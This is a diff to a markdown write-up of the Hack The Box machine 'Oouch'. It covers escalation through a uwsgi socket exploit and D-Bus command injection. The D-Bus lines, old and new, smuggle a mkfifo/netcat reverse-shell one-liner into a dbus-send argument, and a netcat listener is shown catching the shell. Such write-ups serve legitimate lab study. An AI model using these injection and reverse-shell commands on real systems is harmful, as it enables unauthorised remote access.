@@ -449,14 +449,16 @@ def contact():
     return render_template('contact.html', title='Contact', send=False, form=form)
  ```
     
-    In a nutshell, when the `XSS filter` is triggered, the application uses the `REMOTE_ADDR` parameter to send it through the `dbus interface` to the upstream iptables command. We can’t spoof or modify this `REMOTE_ADDR` variable remotely so we’ll have to exploit this another way.
+   
+   In a nutshell, when the `XSS filter` is triggered, the application uses the `REMOTE_ADDR` parameter to send it through the `dbus interface` to the upstream iptables command. We can’t spoof or modify this `REMOTE_ADDR` variable remotely so we’ll have to exploit this another way.
     
-    The `uwsgi.ini` file shows that a UNIX socket is used to communicate between the webserver and the flask application:
+    
+The `uwsgi.ini` file shows that a UNIX socket is used to communicate between the webserver and the flask application:
     
     
     
  Exploiting uwsgi service
- =========================
+ ===========================
   
   
 And the service `uwsgi` is running as `www-data`
@@ -678,7 +680,7 @@ qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "/tmp/n
 qtc@aeb4525789d8:/tmp
 ```
 Grab NutShell as www-data
---------------------------
+---------------------------
 
 ```bash
 qtc@oouch:~$ nc -nlvp 1234
@@ -687,6 +689,7 @@ connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 41652
 whoami
 www-data
 ```
+
 
 D-Bus Exploitation
 --------------------
@@ -698,7 +701,7 @@ D-Bus Exploitation
 run `debus-send`
 
 ```python
-dbus-send --system --type=method_call --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Your-ip 1234 >/tmp/f;"
+www-daat@oouch:~$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.15.135 2345 >/tmp/.0;"
 ```
 
 Reverse Back To terminal
